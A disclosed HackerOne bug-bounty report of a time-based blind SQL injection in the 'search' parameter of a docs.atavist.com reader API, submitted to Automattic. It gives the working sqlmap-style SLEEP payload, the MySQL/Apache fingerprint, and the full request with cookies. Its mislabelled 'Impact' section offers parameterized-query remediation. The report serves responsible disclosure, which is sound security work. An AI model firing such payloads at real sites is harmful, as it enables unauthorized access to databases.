# Sql injection on docs.atavist.com

## Report Details
- **Report ID**: 1039315
- **URL**: https://hackerone.com/reports/1039315
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-11-20T02:02:35.261Z
- **Disclosed**: 2020-12-08T09:32:55.407Z

## Reporter
- **Username**: lu3ky-13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
hello dear team 

I have found SQL injection on docs.atavist.com
url:http://docs.atavist.com/reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0&sort=

parameters: injectable search=0

```
Parameter: search (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: limit=10&offset=20&organization_id=88822&search=0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg&sort=
```
```
[20:54:30] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.2.34
back-end DBMS: MySQL >= 5.0.12
```


Request
-----------

```
GET /reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0&sort= HTTP/1.1
Host: docs.atavist.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _fbp=fb.1.1605829485735.1219501220; __stripe_mid=f950034a-6de5-408c-b227-5ef48058f129d296dd; rgisanonymous=true; rguserid=5625868d-bfff-49dc-90ac-0269e5138dc8; rguuid=true
Upgrade-Insecure-Requests: 1


```

F1087069: 43.PNG

the website in scope other report
https://hackerone.com/reports/950881

## Impact

Use parameterized queries when dealing with SQL queries that contains user input. Parameterized queries allows the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.

## Attachments
- 43.PNG
